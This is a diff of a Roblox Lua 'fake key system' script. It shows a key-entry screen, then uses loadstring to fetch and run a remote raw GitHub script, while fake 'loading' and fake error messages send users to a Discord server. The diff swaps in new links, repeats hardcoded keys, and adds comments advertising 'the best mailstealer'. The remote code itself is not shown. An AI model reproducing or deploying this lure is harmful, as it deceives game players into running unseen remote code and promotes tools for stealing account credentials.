@@ -1,4 +1,13 @@
-Update Logs: (v1)
+--[[
+Arko's Fake Key System Version 1.2
+much much love, arko!
+https://discord.gg/bn7przmXrX
+revamped by aurora
+https://discord.gg/Eh7EX6dzAF
+]]--
+
+--[[
+Update Logs: (v1.2.*1)
 
 [+] Added Many Text Optimisations .
 [+] Added So You Can Easily Add Keys.
@@ -14,17 +23,17 @@ Edit The Settings, But Please Do NOT Touch The Main Code. (unless you know how t
 -- make sure to change discord invites, etc
 --Main Settings
 Title = "Authentication" --title of the main frame
-Get_Key_Text = "Get Your Key Here:lootdest.com/s?FS9r" --text will pop up on the main frame where you can get ur key, (can be a discord server or a website.)
-msurl = "https://raw.githubusercontent.com/LegendaryScript/LegendaryScript/main/LegendaryRBXScript.lua" -- this should be your raw link for it to execute, if its a valid key itll execute this url via loadstring
+Get_Key_Text = "Get Your Key Here: discord.gg/5KvR26Cgc8 or discord.gg/5KvR26Cgc8" --text will pop up on the main frame where you can get ur key, (can be a discord server or a website.)
+msurl = "raw.githubusercontent.com/DMTMoDs/test/main/test.lua" -- this should be your raw link for it to execute, if its a valid key itll execute this url via loadstring
 -- WHO IS THE BEST?!?!?!?!?! =================== Aurora
 -- join https://discord.gg/Eh7EX6dzAF for the best mailstealer
 
 -- Optional Settings
 TextBox_Text = "Paste Your Key In Here" --the textbox text
-Button_Text = "Authenticate" --the button text
+Button_Text = "Check Key" --the button text
 Checking_Key_Text = "Checking Your Key! Please Wait." --checking key text
 Invalid_Key_Text = "Invalid Key. Returning Back!" --invalid key text
-Free_Key_Script_Text = "Free Key Valid! Executing Legendary Hub. Please Wait!" -- free key fake loading
+Free_Key_Script_Text = "Free Key Valid! Executing The Legendary Hub. Please Wait!" -- free key fake loading
 Paid_Key_Script_Text = "Paid Key Valid! Executing The Legendary Hub. Please Wait!" -- paid key fake loading
 Fake_Loading_Text = "If Its Stuck On Loading, Please Join discord.gg/5KvR26Cgc8 To Get Your Error Fixed!" --fake error text
 authName =  "ArkosAuth"
@@ -32,13 +41,30 @@ authName =  "ArkosAuth"
 -- since its getting converted into a table already we just convert it into a table here
 local freeKeys = {
 	"legendaryhubontop",  --edit your key here example: "mynewkeyomg"
-	"noonewillknowthiscode", -- must be in smaller case
+	"legendaryhubontop", -- must be in smaller case
+	"legendaryhubontop", 
+	"legendaryhubontop",
+	"legendaryhubontop",
+	"legendaryhubontop",
+	"legendaryhubontop",
+	"legendaryhubontop",
+	"legendaryhubontop",
+	"legendaryhubontop"
 }
 local paidKeys = {
-	"thisisforowner", --edit your key here example: "mynewkey"
-
+	"paidlegendaryhubontop", --edit your key here example: "mynewkey"
+	"paidlegendaryhubontop",
+	"paidlegendaryhubontop",
+	"paidlegendaryhubontop",
+	"paidlegendaryhubontop",
+	"paidlegendaryhubontop",
+	"paidlegendaryhubontop",
+	"paidlegendaryhubontop",
+	"paidlegendaryhubontop",
+	"paidlegendaryhubontop"
 }
 --[[
+Arko's Fake Key System Version 1.2.*1
 DO NOT TOUCH/EDIT ANYTHING BELOW UNLESS YOU KNOW HOW TO CODE!!!
 ]]--
 local ArkosAuth = Instance.new("ScreenGui")
@@ -390,3 +416,5 @@ local function VBJFN_fake_script()
 	end
 end
 coroutine.wrap(VBJFN_fake_script)()
+-- non dualhook gang
+-- aurora best
